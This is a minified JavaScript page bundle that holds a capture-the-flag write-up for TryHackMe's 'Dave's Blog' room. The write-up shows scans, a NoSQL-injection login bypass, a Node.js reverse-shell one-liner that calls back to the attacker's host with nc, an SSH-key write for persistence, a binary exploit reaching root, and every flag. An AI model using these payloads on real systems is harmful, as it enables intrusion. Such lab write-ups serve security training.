"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8227],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>g});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},d=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},u="mdxType",p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,d=i(e,["components","mdxType","originalType","parentName"]),u=c(t),m=o,g=u["".concat(l,".").concat(m)]||u[m]||p[m]||a;return t?r.createElement(g,s(s({ref:n},d),{},{components:t})):r.createElement(g,s({ref:n},d))}));function g(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,s=new Array(a);s[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[u]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<a;c++)s[c]=t[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},44010:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var r=t(87462),o=(t(67294),t(3905));const a={},s="Dave's Blog",i={unversionedId:"Tryhackme/Daves Blog/Daves Blog",id:"Tryhackme/Daves Blog/Daves Blog",title:"Dave's Blog",description:"My friend Dave made his own blog!",source:"@site/writeups/Tryhackme/Daves Blog/Daves Blog.md",sourceDirName:"Tryhackme/Daves Blog",slug:"/Tryhackme/Daves Blog/",permalink:"/writeups/Tryhackme/Daves Blog/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Dav",permalink:"/writeups/Tryhackme/Dav/"},next:{title:"Develpy",permalink:"/writeups/Tryhackme/Develpy/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Dave&#39;s Blog",id:"task-1-daves-blog",level:2}],d={toc:c},u="wrapper";function p(e){let{components:n,...t}=e;return(0,o.kt)(u,(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"daves-blog"},"Dave's Blog"),(0,o.kt)("p",null,"My friend Dave made his own blog!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/davesblog"},"Dave's Blog")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Code Injection"),(0,o.kt)("li",{parentName:"ul"},"MongoDB Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,o.kt)("li",{parentName:"ul"},"Reverse Engineering")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-daves-blog"},"Task 1 Dave's Blog"),(0,o.kt)("p",null,"My friend Dave made his own blog! You should go check it out."),(0,o.kt)("p",null,"The machine may take a few minutes to fully start up."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"ali@kali:~/CTFs/tryhackme/Dave's Blog$ sudo nmap -sS -sC -sV -O 10.10.202.250\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 14:38 CEST\nNmap scan report for 10.10.202.250\nHost is up (0.034s latency).\nNot shown: 997 filtered ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)\n|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)\n|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)\n80/tcp   open  http    nginx 1.14.0 (Ubuntu)\n| http-robots.txt: 1 disallowed entry\n|_/admin\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Dave's Blog\n3000/tcp open  http    Node.js (Express middleware)\n| http-robots.txt: 1 disallowed entry\n|_/admin\n|_http-title: Dave's Blog\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.71 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Dave's Blog$ gobuster dir -u 10.10.202.250 -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.202.250\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/22 14:40:47 Starting gobuster\n===============================================================\n/admin (Status: 200)\n/Admin (Status: 200)\n/ADMIN (Status: 200)\n/images (Status: 301)\n/javascripts (Status: 301)\n/robots.txt (Status: 200)\n/stylesheets (Status: 301)\n===============================================================\n2020/10/22 14:41:05 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.202.250/admin"},"http://10.10.202.250/admin")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},"<script>\n  if (document.location.hash) {\n    const div = document.createElement(\"div\");\n    div.innerText = decodeURIComponent(document.location.hash.substr(1));\n    div.className = \"note\";\n    document.body.insertBefore(div, document.body.firstChild);\n  }\n  document.querySelector(\"form\").onsubmit = (e) => {\n    /*e.preventDefault();\n      const username = document.querySelector('input[type=text]').value;\n      const password = document.querySelector('input[type=password]').value;\n\n      fetch('', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json',\n        },\n        body: JSON.stringify({username, password})\n      }).then(() => {\n        location.reload();\n      })\n      return false;*/\n  };\n<\/script>\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'POST /admin HTTP/1.1\nHost: 10.10.202.250:3000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.202.250:3000/admin\nContent-Type: application/json\nContent-Length: 25\nConnection: close\nCookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDMzNzE5MDh9.79MYgVd6g0mmXF72wusU6_sVeuPrdod6PmW5j8ADsVg\nUpgrade-Insecure-Requests: 1\n\n{"username":"dave","password":{"$ne":""}}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'HTTP/1.1 302 Found\nX-Powered-By: Express\nSet-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDMzNzE5NjB9.NnSNoBEYTN3FwwYzUXZ1ch8VH9erW_wYVXqW7fvxGeo; Path=/\nLocation: /admin\nVary: Accept\nContent-Type: text/html; charset=utf-8\nContent-Length: 56\nDate: Thu, 22 Oct 2020 13:06:00 GMT\nConnection: close\n\n<p>Found. Redirecting to <a href="/admin">/admin</a></p>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'{\n  "isAdmin": true,\n  "_id": "5ec6e5cf1dc4d364bf864107",\n  "username": "dave",\n  "password": "THM{SuperSecureAdminPassword123}",\n  "__v": 0,\n  "iat": 1603371960\n}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f', ()=>{})\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Dave's Blog$ nc -lnvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.202.250 44048\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\ndave\n$ python -c \"import pty; pty.spawn('/bin/bash')\"\ndave@daves-blog:~/blog$ ls\nls\napp.js  helpers  node_modules  public  settings.json  yarn.lock\nbin     models   package.json  routes  views\ndave@daves-blog:~/blog$ cd ~\ncd ~\ndave@daves-blog:~$ ls\nls\nblog  startup.sh  user.txt\ndave@daves-blog:~$ cat user.txt\ncat user.txt\nTHM{5fa1f779d1835367fdcfa4741bebb88a}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'dave@daves-blog:~$ mongo\nmongo\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27017\nMongoDB server version: 3.6.3\nWelcome to the MongoDB shell.\nFor interactive help, type "help".\nFor more comprehensive documentation, see\n        http://docs.mongodb.org/\nQuestions? Try the support group\n        http://groups.google.com/group/mongodb-user\nServer has startup warnings:\n2020-10-22T12:22:29.062+0000 I STORAGE  [initandlisten]\n2020-10-22T12:22:29.062+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine\n2020-10-22T12:22:29.063+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem\n2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten]\n2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.\n2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.\n2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten]\n> show databases;\nshshow databases;\nadmin       0.000GB\nconfig      0.000GB\ndaves-blog  0.000GB\nlocal       0.000GB\n> use daves-blog\nususe daves-blog\nswitched to db daves-blog\n> show tables\nshshow tables\nposts\nusers\nwhatcouldthisbes\n> db.whatcouldthisbes.find()\ndbdb.whatcouldthisbes.find()\n{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}", "__v" : 0 }\n>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'dave@daves-blog:/$ sudo -l\nsudo -l\nMatching Defaults entries for dave on daves-blog:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser dave may run the following commands on daves-blog:\n    (root) NOPASSWD: /uid_checker\ndave@daves-blog:/$ strings uid_checker\nstrings uid_checker\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\ngets\nputs\nprintf\ngetgid\nsystem\ngetuid\nstrcmp\n__libc_start_main\nGLIBC_2.2.5\n__gmon_start__\nAWAVI\nAUATL\n[]A\\A]A^A_\nHow did you get here???\n/bin/sh\nWelcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID\nYour UID is: %d\nYour GID is: %d\nTHM{runn1ng_str1ngs_1s_b4sic4lly_RE}\nWow! You found the secret function! I still need to finish it..\nInvalid choice\n;*3$"\nGCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.7698\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nuid.c\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\nputs@@GLIBC_2.2.5\n_edata\ngetuid@@GLIBC_2.2.5\nsystem@@GLIBC_2.2.5\nprintf@@GLIBC_2.2.5\n__libc_start_main@@GLIBC_2.2.5\n__data_start\nstrcmp@@GLIBC_2.2.5\n__gmon_start__\n__dso_handle\n_IO_stdin_used\ngetgid@@GLIBC_2.2.5\ngets@@GLIBC_2.2.5\nsecret\n__libc_csu_init\n_dl_relocate_static_pie\n__bss_start\nmain\n__TMC_END__\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.ABI-tag\n.note.gnu.build-id\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got\n.got.plt\n.data\n.bss\n.comment\ndave@daves-blog:/$\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /home/dave/.ssh/authorized_keys\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Daves Blog$ python3 exploit.py\n[+] Connecting to 10.10.202.250 on port 22: Done\n[*] dave@10.10.202.250:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n[+] Starting remote process 'sudo' on 10.10.202.250: pid 1608\nb'Welcome to the UID checker!\\n'\nb'Enter 1 to check your UID or enter 2 to check your GID\\n'\n[*] Switching to interactive mode\nInvalid choice\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# cd /root\n# cat root.txt\nTHM{a0a9c4f6809c84e212ac889d39b9cb48}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Flag 1")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{SuperSecureAdminPassword123}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Flag 2 / User flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{5fa1f779d1835367fdcfa4741bebb88a}")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Flag 3")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{993e107fc66844482bb5dd0e4c485d5b}")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Flag 4")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{runn1ng_str1ngs_1s_b4sic4lly_RE}")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Flag 5 / Root flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{a0a9c4f6809c84e212ac889d39b9cb48}")))}p.isMDXComponent=!0}}]);